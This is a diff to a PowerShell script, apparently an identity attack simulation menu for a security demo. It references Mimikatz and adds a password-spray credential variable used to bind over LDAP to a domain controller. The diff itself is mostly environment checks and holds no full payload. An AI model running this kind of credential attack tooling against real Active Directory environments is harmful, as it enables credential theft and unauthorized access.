@@ -1,4 +1,4 @@
-﻿# ============================================================
+﻿﻿# ============================================================
 #  Identity Attack Menu - Unmanaged Workstation
 #  Run as Administrator (demo account)
 #  Follows the phased scenario from portable_sender.py
@@ -16,10 +16,11 @@ $mimiExe = "$idpDir\Mimikatz\x64\mimikatz.exe"
 
 # --- Validate env vars on startup ---
 $missing = @()
-if (-not $env:ENV_DOMAIN) { $missing += "ENV_DOMAIN" }
-if (-not $env:ENV_DC_IP)  { $missing += "ENV_DC_IP" }
-if (-not $env:ENV_BL)     { $missing += "ENV_BL" }
-if (-not $env:ENV_DT)     { $missing += "ENV_DT" }
+if (-not $env:ENV_DOMAIN)   { $missing += "ENV_DOMAIN" }
+if (-not $env:ENV_DC_IP)    { $missing += "ENV_DC_IP" }
+if (-not $env:ENV_BL)       { $missing += "ENV_BL" }
+if (-not $env:ENV_DT)       { $missing += "ENV_DT" }
+if (-not $env:ENV_PASSWORD) { $missing += "ENV_PASSWORD" }
 if ($missing.Count -gt 0) {
     Write-Host "[!] Missing environment variables: $($missing -join ', ')" -ForegroundColor Red
     Write-Host "    Set them in cmd before running this script:" -ForegroundColor Yellow
@@ -27,6 +28,7 @@ if ($missing.Count -gt 0) {
     Write-Host '    set ENV_DC_IP=172.16.1.6' -ForegroundColor Gray
     Write-Host '    set ENV_BL=10.3.108.30' -ForegroundColor Gray
     Write-Host '    set ENV_DT=10.3.108.31' -ForegroundColor Gray
+    Write-Host '    set ENV_PASSWORD=<spray password>' -ForegroundColor Gray
     pause
     exit 1
 }
@@ -143,7 +145,7 @@ do {
             try {
                 $ldapPath = "LDAP://$env:ENV_DC_IP"
                 $cred_user = "clark.monroe@$env:ENV_DOMAIN"
-                $cred_pass = "$env:ENV_PASSWORD"
+                $cred_pass = $env:ENV_PASSWORD
                 $entry = New-Object DirectoryServices.DirectoryEntry($ldapPath, $cred_user, $cred_pass)
                 $searcher = New-Object DirectoryServices.DirectorySearcher($entry)
 
